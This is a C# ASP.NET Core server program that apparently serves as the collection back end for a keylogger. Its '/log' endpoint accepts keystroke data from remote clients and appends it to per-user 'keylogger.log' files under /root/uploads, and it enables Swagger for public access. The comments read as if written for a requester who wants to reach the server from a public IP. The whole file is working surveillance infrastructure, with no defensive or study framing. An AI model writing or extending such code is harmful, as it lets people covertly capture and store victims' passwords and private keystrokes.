using Microsoft.AspNetCore.Builder;
using Microsoft.AspNetCore.Hosting;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.AspNetCore.Http;
using System.IO;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);

builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

var app = builder.Build();

// Always enable Swagger for this analysis/debug phase, 
// or you can keep it as is if you prefer it only in Development.
// Since you want to access it from public IP, usually it's better to control it via environment.
app.UseSwagger();
app.UseSwaggerUI();

app.UseRouting();

// Update this route to receive the keystrokes correctly
app.MapPost("/log", async (HttpRequest request) =>
{
    var username = request.Query["username"].ToString();
    if (string.IsNullOrWhiteSpace(username))
    {
        return Results.BadRequest("Username is required.");
    }

    using var reader = new StreamReader(request.Body);
    var content = await reader.ReadToEndAsync();

    if (string.IsNullOrEmpty(content))
    {
        return Results.BadRequest("No content.");
    }

    // Sanitize username to prevent directory traversal
    var safeUsername = Path.GetFileName(username);

    var baseUploadPath = "/root/uploads";
    var userUploadPath = Path.Combine(baseUploadPath, safeUsername);
    Directory.CreateDirectory(userUploadPath);
 
    var filePath = Path.Combine(userUploadPath, "keylogger.log");

    // Append the keystrokes to the file
    await File.AppendAllTextAsync(filePath, content);

    return Results.Ok();
});

app.Run();